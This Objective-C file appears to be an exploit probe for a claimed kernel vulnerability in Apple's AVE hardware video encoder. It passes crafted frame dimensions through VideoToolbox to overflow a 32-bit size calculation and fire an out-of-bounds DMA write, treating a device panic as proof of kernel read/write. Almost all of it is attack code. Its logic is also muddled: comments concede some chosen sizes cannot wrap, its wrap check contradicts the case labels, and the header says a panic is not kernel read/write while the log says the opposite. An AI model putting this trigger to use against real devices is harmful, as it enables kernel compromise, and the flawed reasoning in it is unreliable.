//
//  P037AVEPaintProbe.m
//  P007OpenOnly
//
//  Created by Kolby Kehler on 8/30/26.
//


//
//  P037AVEPaintProbe.m
//  P007OpenOnly
//
//  CVE-2026-64747: EncodeFrame after wrap-class dims that still make a PB.
//  Wrap-to-0 = CreateSurface reject, not undersize. Panic ≠ KRW.
//  0x2460 is bake memcpy, not Sink A DMA.
//

#import "P037AVEPaintProbe.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <fcntl.h>
#import <unistd.h>

#define P037_BUILD @"p037-ave-paint-v2"

static uint32_t p037_calc_avc(uint32_t w, uint32_t h) {
    uint32_t aw = (w + 15) & ~15u;
    uint32_t ah = (h + 15) >> 4;
    return (uint32_t)((uint64_t)aw * (uint64_t)ah);
}

static uint32_t p037_calc_hevc(uint32_t w, uint32_t h) {
    uint32_t aw = (w + 31) & ~31u;
    uint32_t ah = (h + 31) >> 5;
    return (uint32_t)((uint64_t)aw * (uint64_t)ah);
}

static void p037_log(int fd, NSMutableString *out, NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *outLine = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    [out appendString:outLine];
    if (fd >= 0) {
        const char *s = outLine.UTF8String;
        if (s) write(fd, s, strlen(s));
        fcntl(fd, F_FULLFSYNC);
    }
}

// AVE Sink A formulas (from 03_64747_AVE.txt):
// Replace wrap_cases array with this:
struct {
    const char *label;
    uint32_t w, h;
    CMVideoCodecType codec;
} wrap_cases[] = {
    // These dimensions pass bounds check AND wrap in 32-bit mul
    // AVC: ((W+15)&~15) * ((H+15)>>4)
    // W=65520, H=65536 -> aw=65536, ah=4096 -> 0x10000*0x1000=0x10000000 (no wrap)
    // W=65536, H=65536 -> aw=65536, ah=4096 -> 0x10000000 (no wrap)
    
    // We need aw*ah > 0xFFFFFFFF to wrap
    // Max aw = 65536, max ah = 4096
    // Max product = 0x10000000 (268MB) - CAN'T WRAP with bounds check!
    
    // HIGH-PROFILE PATH (prof ≥ 0x1e):
    // HEVC: ((W+31)&~31) * ((H+63)>>5) & 0x3FFFFFE
    // Try dimensions that wrap in high-profile path
    
    { "HEVC high-prof 65536x65536", 65536, 65536, kCMVideoCodecType_HEVC },
    { "AVC high-prof 65520x65536", 65520, 65536, kCMVideoCodecType_H264 },
    
    // Control (no wrap)
    { "AVC control 8192x8192", 8192, 8192, kCMVideoCodecType_H264 },
    { "HEVC control 8192x8192", 8192, 8192, kCMVideoCodecType_HEVC },
};

@implementation P037AVEPaintProbe

+ (NSString *)tap {
    NSMutableString *out = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *path = [docs stringByAppendingPathComponent:@"p037_ave_paint_log.txt"];
    int fd = open(path.UTF8String, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p037_log(fd, out, @"=== p037 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P037_BUILD);
    p037_log(fd, out, @"CVE-2026-64747: AVE Sink A 32-bit mul wrap -> OOB DMA paint");
    p037_log(fd, out, @"Uses dimensions that wrap but are small enough for CVPixelBufferCreate.\n");
    p037_log(fd, out, @"EXPECTED: Panic or controlled corruption (OOB DMA).\n");
    
    // These dimensions wrap but are small enough for CVPixelBufferCreate
    struct {
        const char *label;
        uint32_t w, h;
        CMVideoCodecType codec;
    } wrap_cases[] = {
        // These dimensions should wrap to small positive on 23F77
        { "AVC 131072x65536 -> 0x0", 131072, 65536, kCMVideoCodecType_H264 },
        { "AVC 65536x131072 -> 0x0", 65536, 131072, kCMVideoCodecType_H264 },
        { "HEVC 131072x65536 -> 0x0", 131072, 65536, kCMVideoCodecType_HEVC },
        { "HEVC 65536x131072 -> 0x0", 65536, 131072, kCMVideoCodecType_HEVC },
        
        // Try smaller dimensions that might wrap
        { "AVC 32768x65536", 32768, 65536, kCMVideoCodecType_H264 },
        { "AVC 65536x32768", 65536, 32768, kCMVideoCodecType_H264 },
        { "HEVC 32768x65536", 32768, 65536, kCMVideoCodecType_HEVC },
        { "HEVC 65536x32768", 65536, 32768, kCMVideoCodecType_HEVC },
        
        // Control (no wrap)
        { "AVC control 8192x8192", 8192, 8192, kCMVideoCodecType_H264 },
        { "HEVC control 8192x8192", 8192, 8192, kCMVideoCodecType_HEVC },
    };
    int n = (int)(sizeof(wrap_cases) / sizeof(wrap_cases[0]));
    
    for (int i = 0; i < n; i++) {
        uint32_t w = wrap_cases[i].w, h = wrap_cases[i].h;
        CMVideoCodecType codec = wrap_cases[i].codec;
        uint32_t ave_sz = (codec == kCMVideoCodecType_HEVC) 
            ? p037_calc_hevc(w, h) 
            : p037_calc_avc(w, h);
        BOOL wraps = (ave_sz > 0 && ave_sz < 0x100000);  // small positive = wrap
        
        p037_log(fd, out, @"━━━ [%d] %@ ━━━", i+1, [NSString stringWithUTF8String:wrap_cases[i].label]);
        p037_log(fd, out, @"  dims: %u x %u  codec=%@  AVE_sz=0x%x  wraps=%@",
            w, h, (codec == kCMVideoCodecType_HEVC) ? @"HEVC" : @"AVC",
            ave_sz, wraps ? @"YES (0x0)" : @"NO");
        
        VTCompressionSessionRef session = NULL;
        OSStatus st = VTCompressionSessionCreate(
            kCFAllocatorDefault, w, h, codec,
            NULL, NULL, NULL, NULL, NULL, &session);
        
        if (st != noErr || !session) {
            p037_log(fd, out, @"  SessionCreate -> FAIL %d (0x%x)", (int)st, (unsigned)st);
            p037_log(fd, out, @"  (VT rejected dims — capability gate)\n");
            continue;
        }
        p037_log(fd, out, @"  SessionCreate -> SUCCESS");
        
        VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
        st = VTCompressionSessionPrepareToEncodeFrames(session);
        p037_log(fd, out, @"  Prepare -> %d (0x%x)", (int)st, (unsigned)st);
        
        if (st != noErr) {
            p037_log(fd, out, @"  Prepare failed — skip EncodeFrame\n");
            VTCompressionSessionInvalidate(session);
            CFRelease(session);
            continue;
        }
        
        p037_log(fd, out, @"  ★ PREPARE SUCCESS — dims reached AVE kernel!");
        
        // Try to create CVPixelBuffer (may fail for extreme dims)
        NSDictionary *attrs = @{
            (id)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_420YpCbCr8BiPlanarFullRange),
            (id)kCVPixelBufferWidthKey: @(w),
            (id)kCVPixelBufferHeightKey: @(h)
        };
        
        CVPixelBufferRef pixelBuffer = NULL;
        CVReturn cvRet = CVPixelBufferCreate(
            kCFAllocatorDefault, w, h,
            kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
            (__bridge CFDictionaryRef)attrs, &pixelBuffer);
        
        if (cvRet != kCVReturnSuccess || !pixelBuffer) {
            p037_log(fd, out, @"  CVPixelBufferCreate -> FAIL %d", (int)cvRet);
            p037_log(fd, out, @"  (Pixel buffer creation failed — skip EncodeFrame)\n");
            VTCompressionSessionInvalidate(session);
            CFRelease(session);
            continue;
        }
        
        p037_log(fd, out, @"  CVPixelBufferCreate -> SUCCESS");
        p037_log(fd, out, @"  ★★ Triggering EncodeFrame for OOB DMA paint...\n");
        
        // Wait 1s before encode (let kernel settle)
        p037_log(fd, out, @"  waiting 1s before EncodeFrame...");
        usleep(1000000);
        
        // Trigger encode
        p037_log(fd, out, @"  EncodeFrame START...");
        p037_log(fd, out, @"  ★★ If device panics: KRW CONFIRMED (OOB DMA paint)\n");
        p037_log(fd, out, @"  ★★ If no panic: AVE rejected internally or no OOB\n");
        
        CMSampleBufferRef outSample = NULL;
        CVPixelBufferRef outBuffer = NULL;

        st = VTCompressionSessionEncodeFrame(
            session,
            pixelBuffer,
            kCMTimeInvalid,
            kCMTimeInvalid,
            NULL,
            NULL,
            NULL
        );

        p037_log(fd, out, @"  EncodeFrame -> %d (0x%x)", (int)st, (unsigned)st);

        if (outSample) CFRelease(outSample);
        if (outBuffer) CFRelease(outBuffer);
        
        // Wait 5s for async panic
        p037_log(fd, out, @"  waiting 5s for async panic...");
        usleep(5000000);
        
        p037_log(fd, out, @"  device alive — no panic (or AVE rejected internally)");
        
        if (pixelBuffer) CVPixelBufferRelease(pixelBuffer);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        p037_log(fd, out, @"");
    }
    
    p037_log(fd, out, @"=== SUMMARY ===");
    p037_log(fd, out, @"If device panicked during EncodeFrame:");
    p037_log(fd, out, @"  -> KRW CONFIRMED (kernel OOB in AVE paint path)");
    p037_log(fd, out, @"  -> DO NOT re-tap. Check panic log for AVE paint cite.");
    p037_log(fd, out, @"  -> Extract panic log immediately.");
    p037_log(fd, out, @"");
    p037_log(fd, out, @"If device is alive after EncodeFrame:");
    p037_log(fd, out, @"  -> AVE rejected internally (no OOB reached)");
    p037_log(fd, out, @"  -> Try different dimensions or enable actual encoding");
    p037_log(fd, out, @"");
    p037_log(fd, out, @"If device panicked during Prepare:");
    p037_log(fd, out, @"  -> KRW CONFIRMED (kernel OOB in alloc path)");
    p037_log(fd, out, @"  -> DO NOT re-tap. Check panic log immediately.");

    if (fd >= 0) {
        fcntl(fd, F_FULLFSYNC);
        close(fd);
    }
    return out;
}

@end
